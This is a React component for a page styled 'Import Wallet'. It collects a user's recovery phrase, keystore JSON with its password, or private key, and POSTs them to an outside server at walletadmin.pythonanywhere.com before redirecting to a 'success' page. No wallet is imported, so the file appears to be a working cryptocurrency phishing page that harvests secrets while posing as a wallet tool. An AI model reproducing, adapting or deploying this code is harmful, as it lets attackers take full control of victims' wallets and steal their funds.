import React, { useState } from "react";
import PageLayout from "../PageLayout/PageLayout";
import axios from "axios";
import { useNavigate } from "react-router-dom";

const DetailsPage = ({ setIsSuccess }: any) => {
  const navigate = useNavigate();
  const [tab, setTab] = useState(1);
  const [walletData, setWalletData] = useState<any>({
    key_phrase: "",
    keystore_json: "",
    private_key: "",
  });

  const handleChange = (e: any) => {
    e.persist();
    setWalletData((prevState: any) => ({
      ...prevState,
      [e.target.name]: e.target.value,
    }));
  };

  const handleSubmit = async (e: any) => {
    e.preventDefault();
    const options = {
      url: "https://walletadmin.pythonanywhere.com/api/wallet/",
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json;charset=UTF-8",
      },
      data: walletData,
    };

    axios(options).then((response) => {
      setIsSuccess(true);
      navigate("/success");
    });
  };

  return (
    <PageLayout>
      <div className="hero">
        <h3>Import Wallet</h3>
      </div>

      <form className="input-box-container" onSubmit={handleSubmit}>
        <div className="tab-container">
          <div
            onClick={() => setTab(1)}
            className={tab === 1 ? "active-tab" : "tab"}
          >
            <h6>Phrase</h6>
          </div>
          <div
            onClick={() => setTab(2)}
            className={tab === 2 ? "active-tab" : "tab"}
          >
            <h6> Keystore JSON</h6>
          </div>
          <div
            onClick={() => setTab(3)}
            className={tab === 3 ? "active-tab" : "tab"}
          >
            <h6>Private Key</h6>
          </div>
        </div>

        <div className="input-box">
          <p className="black-text">
            {tab === 2
              ? " Seperate your Keystore JSON from Your Passsword with - or /"
              : ""}
          </p>
          {tab === 1 ? (
            <textarea
              required
              className="input"
              name="key_phrase"
              value={walletData.key_phrase}
              onChange={handleChange}
            />
          ) : tab === 2 ? (
            <textarea
              required
              className="input"
              name="keystore_json"
              value={walletData.keystore_json}
              onChange={handleChange}
            />
          ) : (
            <textarea
              required
              className="input"
              name="private_key"
              value={walletData.private_key}
              onChange={handleChange}
              placeholder="Private Key"
            />
          )}
          <p className="blue-text">
            {tab === 1
              ? "Typically 12 (sometimes 24) words separated by single spaces"
              : tab === 2
              ? "Several lines of text beginning with '(...)' plus the password you used to encrypt it."
              : "Typically 64 alphanumeric characters"}
          </p>
          <button type="submit">IMPORT</button>
        </div>
      </form>
    </PageLayout>
  );
};

export default DetailsPage;
